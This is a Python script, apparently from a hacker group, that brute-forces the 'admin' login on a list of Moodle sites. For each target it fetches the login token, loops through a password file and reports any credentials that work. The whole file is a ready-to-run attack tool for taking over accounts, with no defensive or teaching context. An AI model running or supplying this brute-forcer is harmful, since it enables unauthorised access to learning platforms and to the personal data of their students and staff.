import requests,re, sys
from bs4 import BeautifulSoup as bs4

user = "admin" #user default
sess = requests.Session()

def banner():
    print("""
    ..................  | Author : FilthyRoot
    . Moodle Bruter! .  | Github : @soracyberteam
    ..................  | Copyright (c) 2020 Jogjakarta Hacker Link
    """)

def get_token(target):
    r = sess.get(target + "/login/index.php")
    s = bs4(r.text, "html.parser").find("input", attrs={'name': 'logintoken'})
    return s.get("value")

def login_moodle(target, user, passwd,token):
    data = {
        'logintoken': token,
        'username': user,
        'password': passwd,
    }
    r = sess.post(target + "/login/index.php", data = data)
    if re.search("loginerrormessage", r.text) or re.search("Anda belum login.", r.text) or re.search("Invalid login, please try again",r.text):
        sess.cookies.clear()
        return False
    else:
        sess.cookies.clear()
        return True

banner()
if len(sys.argv) < 2:
    print("Usage : python moodle.py target.txt\nNote : target list WITH http://")
else:
    pwx = open("pass.txt", "r")
    lists = pwx.read().split("\n") #load pass list
    f = open(sys.argv[1], "r")
    x = f.read().split("\n")
    for i in x:
        print("[*] Checking " + i + "...")
        for pw in lists:
            token = get_token(i)
            login = login_moodle(i, user, pw, token)
            try:
                if login:
                    print("[+] "+ str(login) + " => " + user + ":" + pw)
                    exit()
                else:
                    print("[x] "+ str(login) + " => " + user + ":" + pw)
            except:
                pass
